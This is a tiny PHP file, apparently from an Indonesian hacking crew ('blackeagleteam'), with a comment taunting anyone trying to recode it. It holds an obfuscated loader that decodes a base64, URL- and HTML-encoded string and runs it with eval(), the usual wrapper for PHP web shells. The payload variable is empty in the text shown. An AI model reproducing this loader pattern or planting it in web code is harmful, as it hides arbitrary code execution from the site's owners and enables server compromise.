<?php
/*
            IG: @blackeagleteam.id
            Mau Ngapain Cukk Mau Recode Yah!
            Eitss Tidak Bisa
*/
$p3mu14 = "";
$arif = "";
eval(htmlspecialchars_decode(urldecode(base64_decode($p3mu14))));
exit;
?>